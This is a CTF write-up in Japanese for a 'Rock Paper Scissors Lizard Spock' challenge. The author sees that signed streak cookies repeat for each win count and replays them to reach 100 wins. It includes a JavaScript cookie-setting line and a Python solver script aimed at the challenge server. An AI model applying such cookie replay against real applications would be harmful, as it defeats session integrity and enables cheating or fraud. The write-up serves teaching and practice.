# Rock Paper Scissors Lizard Spock

## / Overview

Cookieのリプレイ攻撃

## / Writeup

通常のじゃんけんに"lizard"と"spock"が追加された計5種類の手がある拡張じゃんけんで連続100勝しなければなりません。

まずは普通に"spock"を出し続けて（どの手でも大丈夫です）、勝ち負け引き分けの挙動を観察しましょう。~~感覚では引き分けの回数が非常に多かった気がしますが、~~なんとか全てのパターンを用意出来ました。

1. **負け引き分けの場合**

    一度でも負けると連勝数が0に戻り、Cookieに以下の値がセットされます。

    `streak=s%3A0.fYzI9jilrK9ZFBqSDJmk32zB41oBG89kaeCHSkDVhDk`

2. **勝ちの場合**

    1勝すると次の値がセットされます。

    `streak=s%3A1.V4YSwyFQ%2BplVB9Za8AXqfwiAjOaATqE`

    頑張って2連勝すると次の値がセットされます。

    `streak=s%3A2.IfH0cCEPFN%2FTBuGGGTwY3mO3M0X3XHgVQbiJlLbbAp0`

何度か試すと、**同じ連勝数では同じCookieがセットされる**ことに気付きます。つまり現在の連勝数が0でも

```js
document.cookie = "`streak=s%3A2.IfH0cCEPFN%2FTBuGGGTwY3mO3M0X3XHgVQbiJlLbbAp0`"
```

をセットすることで2連勝から始めることが出来ます。同じ原理で、勝ったときだけCookieを更新していけば100連勝達成できます。

## / Solver

```py
import requests

win = 0
streak = ""
while True:
    response = requests.post(
        "http://34.170.146.252:31548/rpsls",
        data="input=spock",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": streak
            }
        )
    if "You beat" in response.text:
        win += 1
        streak = "streak=" + response.history[0].cookies.get_dict().get("streak")
        print(f"win {win} times")
        print(streak)
        if win >= 100:
            print(response.text)
            break
```

